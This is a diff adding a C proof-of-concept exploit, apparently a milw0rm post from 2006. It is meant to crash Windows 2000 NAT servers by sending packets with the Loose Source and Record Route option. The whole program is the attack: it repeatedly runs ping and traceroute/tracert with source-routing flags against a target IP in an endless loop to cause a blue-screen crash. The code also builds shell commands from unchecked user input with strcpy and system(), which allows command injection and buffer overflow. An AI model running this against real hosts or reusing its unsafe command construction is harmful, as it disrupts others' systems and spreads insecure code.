@@ -1,0 +1,132 @@
+/*
+
+####################################
+# 
+# Windows TCP/IP source routing poc
+# C version...
+#
+# by Preddy
+#
+# RootShell Security Group
+#
+# Shoutz 2: 
+#
+#  Jimmy and ByteCoder + 
+#  Rs Crew + 
+#  Rest of the world :D
+#
+#
+####################################
+
+Compile:
+
+gcc win-tcpip-dos.c -o wintcpipdos
+
+Info:
+
+Published:     14.06.2006
+Source:        ANDREYMINAEV
+Type:          remote
+Level:         9/10
+
+Buffer overflow on ICMP packets with 
+Loose Source and Record Route IP options. 
+Short message translation: There are DoS 
+conditions in Windows 2000 built-in NAT 
+server. Tested configuration: Windows 2000 
+English Standard/Advanced Service Pack 4 
++ Update Rollup 1 for Service Pack 4 with 
+NAT server enabled. While routing packets 
+with options "Loose Source and Record Route" 
+defined by RFC 791 through server, Windows 
+crashes to BSOD with error in tcpip.sys or 
+ntoskrnl.exe, or system hangs or system 
+began instable work. It doesn't metter if 
+packets are from internal or external 
+networks. Use attached script to test 
+vulnerability. On Windows 2003 problem 
+doesn't present. It's also likely same 
+problem to present in Windows 2000 + 
+ISA 2000. Code execution is potentially possible.
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+main(int argc, char *argv[])
+{
+
+char dos_ip[255];
+char mysystem[10];
+char ping[20+1];
+char trace[100];
+
+
+if(argc != 3)
+{
+
+printf("\n\nWindows TCP/IP source routing Dos - by Preddy\n");
+printf("Usage: %s <ip> <mysystem>\n", argv[0]);
+printf("Example: %s 127.0.0.1 linux\n", argv[0]);
+printf("Uses the ping and the traceroute utility on your system\n", argv[0]);
+printf("Should cause a BSOD on the remote system\n");
+printf("More info: http://www.security.nnov.ru/Fnews753.html\n\n");
+exit(1);
+}
+
+strcpy(dos_ip, argv[1]);
+strcpy(mysystem, argv[2]);
+
+
+if((strcmp (argv[2],"linux"))==0)
+{
+
+printf("\nTarget: %s\n", dos_ip);
+printf("MySystem: %s\n", mysystem);
+printf("Sending Payload...\n\n");
+
+
+strcpy(ping, "ping -c 1 ");
+strncat(ping,argv[1],9);
+
+strcpy(trace, "traceroute -m 1 -g 0.0.0.0 ");
+strncat(trace,argv[1],9);
+
+
+while(1)
+{
+system(trace);
+system(ping);
+}
+
+}
+
+if((strcmp (argv[2],"windows"))==0)
+{
+
+printf("Target: %s\n", dos_ip);
+printf("MySystem: %s\n", mysystem);
+printf("Sending Payload...\n");
+
+
+strcpy(ping, "ping -n 1 ");
+strncat(ping,argv[1],9);
+
+strcpy(trace, "tracert -h 1 -j 0.0.0.0 ");
+strncat(trace,argv[1],9);
+
+
+while(1)
+{
+system(trace);
+system(ping);
+}
+
+}
+
+}
+
+// milw0rm.com [2006-06-30]
